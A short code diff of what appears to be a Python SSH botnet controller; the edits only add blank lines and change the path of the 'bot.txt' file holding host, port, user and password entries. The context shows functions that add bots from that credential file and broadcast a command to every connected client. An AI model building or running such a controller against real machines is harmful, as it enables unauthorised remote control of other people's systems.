@@ -25,6 +25,7 @@ class Client:
         self.session.prompt()
         return self.session.before
 
+
 def botnetCommand(command):
     for client in botNet:
         if client.connect() != 0:
@@ -33,13 +34,14 @@ def botnetCommand(command):
             print("[*] Output From:"+client.host+": ", end='')
             print("[+]:"+output.decode("utf-8"))
 
+
 def addClient(host, port, user, password):
     client = Client(host, port, user, password)
     botNet.append(client)
 
 
 def addBot():
-    f = open('bot.txt')
+    f = open('../res/bot.txt')
     for item in f.readlines():
         item = item.strip()
         para = re.split(' ', item)
